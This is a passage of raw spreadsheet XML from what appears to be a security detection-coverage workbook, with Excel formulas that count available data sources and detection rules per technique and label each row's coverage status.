      <c r="U150" t="s">
        <v>980</v>
      </c>
      <c r="V150" t="s">
        <v>981</v>
      </c>
      <c r="W150" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="151" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A151" t="s">
        <v>976</v>
      </c>
      <c r="B151" t="s">
        <v>982</v>
      </c>
      <c r="C151" t="s">
        <v>983</v>
      </c>
      <c r="D151" t="s">
        <v>977</v>
      </c>
      <c r="E151" t="s">
        <v>984</v>
      </c>
      <c r="F151" s="9">
        <f t="shared" si="2"/>
        <v>2</v>
      </c>
      <c r="G151" s="9" cm="1">
        <f t="array" ref="G151">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H151" s="9" t="str" cm="1">
        <f t="array" ref="H151">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I151" s="9" t="str" cm="1">
        <f t="array" ref="I151">IF(SUM(IF($C151=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C151=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J151" s="9" t="str" cm="1">
        <f t="array" ref="J15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51" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M151" s="9" cm="1">
        <f t="array" ref="M151">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N151" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O151" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P151" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S15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51" t="s">
        <v>979</v>
      </c>
      <c r="U151" t="s">
        <v>985</v>
      </c>
      <c r="V151" t="s">
        <v>986</v>
      </c>
      <c r="W151" t="b">
        <v>1</v>
      </c>
      <c r="X151" t="s">
        <v>976</v>
      </c>
    </row>
    <row r="152" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A152" t="s">
        <v>976</v>
      </c>
      <c r="B152" t="s">
        <v>987</v>
      </c>
      <c r="C152" t="s">
        <v>265</v>
      </c>
      <c r="D152" t="s">
        <v>977</v>
      </c>
      <c r="E152" t="s">
        <v>978</v>
      </c>
      <c r="F152" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G152" s="9" cm="1">
        <f t="array" ref="G152">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H152" s="9" t="str" cm="1">
        <f t="array" ref="H152">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I152" s="9" t="str" cm="1">
        <f t="array" ref="I152">IF(SUM(IF($C152=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C152=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J152" s="9" t="str" cm="1">
        <f t="array" ref="J15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52" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M152" s="9" cm="1">
        <f t="array" ref="M152">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N152" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O152" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P152" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S15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52" t="s">
        <v>368</v>
      </c>
      <c r="U152" t="s">
        <v>988</v>
      </c>
      <c r="V152" t="s">
        <v>989</v>
      </c>
      <c r="W152" t="b">
        <v>1</v>
      </c>
      <c r="X152" t="s">
        <v>976</v>
      </c>
    </row>
    <row r="153" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A153" t="s">
        <v>976</v>
      </c>
      <c r="B153" t="s">
        <v>990</v>
      </c>
      <c r="C153" t="s">
        <v>252</v>
      </c>
      <c r="D153" t="s">
        <v>977</v>
      </c>
      <c r="E153" t="s">
        <v>978</v>
      </c>
      <c r="F153" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G153" s="9" cm="1">
        <f t="array" ref="G153">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H153" s="9" t="str" cm="1">
        <f t="array" ref="H153">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I153" s="9" t="str" cm="1">
        <f t="array" ref="I153">IF(SUM(IF($C153=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C153=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J153" s="9" t="str" cm="1">
        <f t="array" ref="J15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53" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M153" s="9" cm="1">
        <f t="array" ref="M153">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N153" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O153" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P153" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S15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53" t="s">
        <v>991</v>
      </c>
      <c r="U153" t="s">
        <v>992</v>
      </c>
      <c r="V153" t="s">
        <v>993</v>
      </c>
      <c r="W153" t="b">
        <v>1</v>
      </c>
      <c r="X153" t="s">
        <v>976</v>
      </c>
    </row>
    <row r="154" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A154" t="s">
        <v>976</v>
      </c>
      <c r="B154" t="s">
        <v>994</v>
      </c>
      <c r="C154" t="s">
        <v>237</v>
      </c>
      <c r="D154" t="s">
        <v>977</v>
      </c>
      <c r="E154" t="s">
        <v>978</v>
      </c>
      <c r="F154" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G154" s="9" cm="1">
        <f t="array" ref="G154">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H154" s="9" t="str" cm="1">
        <f t="array" ref="H154">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I154" s="9" t="str" cm="1">
        <f t="array" ref="I154">IF(SUM(IF($C154=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C154=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J154" s="9" t="str" cm="1">
        <f t="array" ref="J15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54" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M154" s="9" cm="1">
        <f t="array" ref="M154">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N154" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O154" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P154" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S15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54" t="s">
        <v>517</v>
      </c>
      <c r="U154" t="s">
        <v>995</v>
      </c>
      <c r="V154" t="s">
        <v>996</v>
      </c>
      <c r="W154" t="b">
        <v>1</v>
      </c>
      <c r="X154" t="s">
        <v>976</v>
      </c>
    </row>
    <row r="155" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A155" t="s">
        <v>997</v>
      </c>
      <c r="B155" t="s">
        <v>997</v>
      </c>
      <c r="C155" t="s">
        <v>110</v>
      </c>
      <c r="D155" t="s">
        <v>9</v>
      </c>
      <c r="E155" t="s">
        <v>998</v>
      </c>
      <c r="F155" s="9">
        <f t="shared" si="2"/>
        <v>4</v>
      </c>
      <c r="G155" s="9" cm="1">
        <f t="array" ref="G155">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H155" s="9" cm="1">
        <f t="array" ref="H155">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I155" s="9" t="str" cm="1">
        <f t="array" ref="I155">IF(SUM(IF($C155=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C155=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J155" s="9" t="str" cm="1">
        <f t="array" ref="J15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55" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M155" s="9" cm="1">
        <f t="array" ref="M155">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N155" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O155" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P155" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S15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55" t="s">
        <v>999</v>
      </c>
      <c r="U155" t="s">
        <v>1000</v>
      </c>
      <c r="V155" t="s">
        <v>1001</v>
      </c>
      <c r="W155" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="156" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A156" t="s">
        <v>1002</v>
      </c>
      <c r="B156" t="s">
        <v>1002</v>
      </c>
      <c r="C156" t="s">
        <v>196</v>
      </c>
      <c r="D156" t="s">
        <v>8</v>
      </c>
      <c r="E156" t="s">
        <v>434</v>
      </c>
      <c r="F156" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G156" s="9" cm="1">
        <f t="array" ref="G156">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H156" s="9" cm="1">
        <f t="array" ref="H156">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I156" s="9" t="str" cm="1">
        <f t="array" ref="I156">IF(SUM(IF($C156=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C156=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J156" s="9" t="str" cm="1">
        <f t="array" ref="J15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56" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M156" s="9" cm="1">
        <f t="array" ref="M156">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N156" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O156" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P156" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S15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56" t="s">
        <v>679</v>
      </c>
      <c r="U156" t="s">
        <v>1003</v>
      </c>
      <c r="V156" t="s">
        <v>1004</v>
      </c>
      <c r="W156" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="157" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A157" t="s">
        <v>1005</v>
      </c>
      <c r="B157" t="s">
        <v>1005</v>
      </c>
      <c r="C157" t="s">
        <v>147</v>
      </c>
      <c r="D157" t="s">
        <v>8</v>
      </c>
      <c r="E157" t="s">
        <v>434</v>
      </c>
      <c r="F157" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G157" s="9" cm="1">
        <f t="array" ref="G157">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H157" s="9" cm="1">
        <f t="array" ref="H157">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I157" s="9" t="str" cm="1">
        <f t="array" ref="I157">IF(SUM(IF($C157=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C157=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J157" s="9" t="str" cm="1">
        <f t="array" ref="J15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57" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M157" s="9" cm="1">
        <f t="array" ref="M157">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N157" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O157" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P157" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S15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57" t="s">
        <v>425</v>
      </c>
      <c r="U157" t="s">
        <v>1006</v>
      </c>
      <c r="V157" t="s">
        <v>1007</v>
      </c>
      <c r="W157" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="158" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A158" t="s">
        <v>1008</v>
      </c>
      <c r="B158" t="s">
        <v>1008</v>
      </c>
      <c r="C158" t="s">
        <v>21</v>
      </c>
      <c r="D158" t="s">
        <v>8</v>
      </c>
      <c r="E158" t="s">
        <v>1009</v>
      </c>
      <c r="F158" s="9">
        <f t="shared" si="2"/>
        <v>3</v>
      </c>
      <c r="G158" s="9" cm="1">
        <f t="array" ref="G158">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H158" s="9" cm="1">
        <f t="array" ref="H158">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>4</v>
      </c>
      <c r="I158" s="9" t="str" cm="1">
        <f t="array" ref="I158">IF(SUM(IF($C158=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C158=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J158" s="9" cm="1">
        <f t="array" ref="J15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158" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>4</v>
      </c>
      <c r="M158" s="9" cm="1">
        <f t="array" ref="M158">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>4</v>
      </c>
      <c r="N158" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O158" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P158" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S15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58" t="s">
        <v>1010</v>
      </c>
      <c r="U158" t="s">
        <v>1011</v>
      </c>
      <c r="V158" t="s">
        <v>1012</v>
      </c>
      <c r="W158" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="159" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A159" t="s">
        <v>1008</v>
      </c>
      <c r="B159" t="s">
        <v>1013</v>
      </c>
      <c r="C159" t="s">
        <v>1014</v>
      </c>
      <c r="D159" t="s">
        <v>8</v>
      </c>
      <c r="E159" t="s">
        <v>1015</v>
      </c>
      <c r="F159" s="9">
        <f t="shared" si="2"/>
        <v>5</v>
      </c>
      <c r="G159" s="9" cm="1">
        <f t="array" ref="G159">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H159" s="9" t="str" cm="1">
        <f t="array" ref="H159">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I159" s="9" t="str" cm="1">
        <f t="array" ref="I159">IF(SUM(IF($C159=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C159=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J159" s="9" t="str" cm="1">
        <f t="array" ref="J15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59" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M159" s="9" cm="1">
        <f t="array" ref="M159">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N159" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O159" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P159" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S15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59" t="s">
        <v>368</v>
      </c>
      <c r="U159" t="s">
        <v>1016</v>
      </c>
      <c r="V159" t="s">
        <v>1012</v>
      </c>
      <c r="W159" t="b">
        <v>1</v>
      </c>
      <c r="X159" t="s">
        <v>1008</v>
      </c>
    </row>
    <row r="160" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A160" t="s">
        <v>1008</v>
      </c>
      <c r="B160" t="s">
        <v>1017</v>
      </c>
      <c r="C160" t="s">
        <v>255</v>
      </c>
      <c r="D160" t="s">
        <v>8</v>
      </c>
      <c r="E160" t="s">
        <v>1018</v>
      </c>
      <c r="F160" s="9">
        <f t="shared" si="2"/>
        <v>5</v>
      </c>
      <c r="G160" s="9" cm="1">
        <f t="array" ref="G160">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H160" s="9" t="str" cm="1">
        <f t="array" ref="H160">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I160" s="9" t="str" cm="1">
        <f t="array" ref="I160">IF(SUM(IF($C160=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C160=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J160" s="9" t="str" cm="1">
        <f t="array" ref="J16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60" s="9">
